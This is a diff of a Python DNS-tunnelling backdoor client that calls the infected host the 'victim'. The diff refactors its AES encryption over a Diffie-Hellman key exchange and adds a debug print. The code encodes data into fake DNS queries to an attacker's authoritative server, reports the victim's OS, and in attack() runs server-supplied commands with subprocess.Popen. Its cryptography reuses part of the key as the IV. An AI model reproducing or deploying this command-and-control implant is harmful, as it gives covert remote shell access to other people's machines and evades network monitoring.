@@ -52,19 +52,25 @@ identify: bytes = secrets.token_hex(nbytes=4).encode()  # identify number
 dh = pyDH.DiffieHellman()
 dH_pubkey: int = dh.gen_public_key()
 shared_key = None
-aes_cipher_encrypting = None
-aes_cipher_decrypting = None
+
+
+def cipher_obj(key: bytes):
+    """
+    Creating an AES cipher block for encrypting & decrypting.
+    The cipher object is working only once - so we recreating it every encrypting/decrypting.
+
+    :param key: the encrypting-decrypting shared key.
+    :returns: AES cipher block for encrypting/decrypting.
+    """
+    return AES.new(key[:32], AES.MODE_CBC, iv=key[33:49])
 
 
 def key_exchange():
     """
     Diffie Hellman key exchanging with the server.
-
     :returns: code and command to preform
     """
     global shared_key
-    global aes_cipher_encrypting
-    global aes_cipher_decrypting
     global os_type
 
     # encode the victim public key with base32 and send it to the server
@@ -73,13 +79,8 @@ def key_exchange():
     # get the public key of the server and generate the shared key:
     the_code, base32_server_dh_pubkey = send_req_recv_res(base32_public_key)
     server_dh_pubkey = base64.b32decode(base32_server_dh_pubkey)
-    shared_key = dh.gen_shared_key(int.from_bytes(server_dh_pubkey, 'little'))
+    shared_key = dh.gen_shared_key(int.from_bytes(server_dh_pubkey, 'little')).encode()
 
-    # create the encrypting and decrypting object, using AES and the key is the shared key
-    aes_cipher_encrypting = AES.new(shared_key[:32].encode(), AES.MODE_CBC, iv=shared_key[33:49].encode())
-    aes_cipher_decrypting = AES.new(shared_key[:32].encode(), AES.MODE_CBC, iv=shared_key[33:49].encode())
-
-    # TODO: maybe next it will be completely IKE
     # send the victim os type and with it finish the key exchanging
     os_type = build_req(CLIENT_COMMANDS['keyExchange3'], platform.system().encode())
     return send_req_recv_res(os_type)  # return the next command to perform and it's code
@@ -88,13 +89,14 @@ def key_exchange():
 def build_req(cmd_code: int, msg: bytes):
     """
     Building the fake url to be send in fake DNS request to server.
-
     :param cmd_code: the fake url's code.
     :param msg: the data.
     :return: an encrypted message in AES, encoded to base32 with '.' every 63 chars
     """
-    if aes_cipher_encrypting:  # we encrypt the message only after the key exchange
-        encrypted_msg = aes_cipher_encrypting.encrypt(pad(msg, AES.block_size))
+    # we encrypt the message only after the key exchange
+    if shared_key:
+        aes_encrypting = cipher_obj(shared_key)
+        encrypted_msg = aes_encrypting.encrypt(pad(msg, AES.block_size))
         base32_msg = base64.b32encode(encrypted_msg)
     else:
         base32_msg = base64.b32encode(msg)
@@ -114,14 +116,12 @@ def send_req_recv_res(fake_domain: bytes):
     """
     Send the given request domain to the server, get the response
     and parse from it the code and the next operation.
-
     :param fake_domain: the fake domain with the answer to the server.
     :return: response code and next operation
     """
     # The url's maximum length in a DNS request is 255 characters.
     # If we have more than it - we need to split it into separate requests and send each one of them.
     if len(fake_domain) > MAX_DOMAIN:
-
         enc_codes = [base64.b32encode(str(CLIENT_COMMANDS['more']).encode()),
                      base64.b32encode(str(CLIENT_COMMANDS['next']).encode()),
                      base64.b32encode(str(CLIENT_COMMANDS['last']).encode())]
@@ -148,7 +148,6 @@ def send_req_recv_res(fake_domain: bytes):
 def send_req(qname: bytes):
     """
     Send the DNS request with the answer to the Authoritative DNS server.
-
     :param qname: the fake url
     :return: code of answer, next command to perform.
     """
@@ -179,7 +178,6 @@ def send_req(qname: bytes):
 def parse_response(dns_response: DNSRR):
     """
     parse the code and command from the dns response from server.
-
     :param dns_response: DNS RR from the server
     :return: next command to perform and its code.
     """
@@ -218,15 +216,17 @@ def parse_response(dns_response: DNSRR):
 def decode_msg(encrypted_msg: bytes) -> str:
     """
     Get an encrypted message from server and decrypt it.
-
     :param encrypted_msg: the encrypted message
     :return: plain text message
     """
 
     base32_msg = base64.b32decode(encrypted_msg)  # decode the response
     # decrypt the encoded msg
-    return unpad(aes_cipher_decrypting.decrypt(base32_msg),
-                 AES.block_size).decode() if aes_cipher_decrypting else base32_msg.decode()
+    if shared_key:
+        aes_decrypting = cipher_obj(shared_key)
+        return unpad(aes_decrypting.decrypt(base32_msg), AES.block_size).decode()
+    else:
+        return base32_msg.decode()
 
 
 def attack():
@@ -237,6 +237,7 @@ def attack():
     cmd_code, command = key_exchange()
 
     while True:
+        print(cmd_code, command)
         if cmd_code == SERVER_COMMANDS['ok&process']:
             # run the command in the shell...
             output: bytes = subprocess.Popen(command.strip().split(' '), stdout=subprocess.PIPE).communicate()[0]
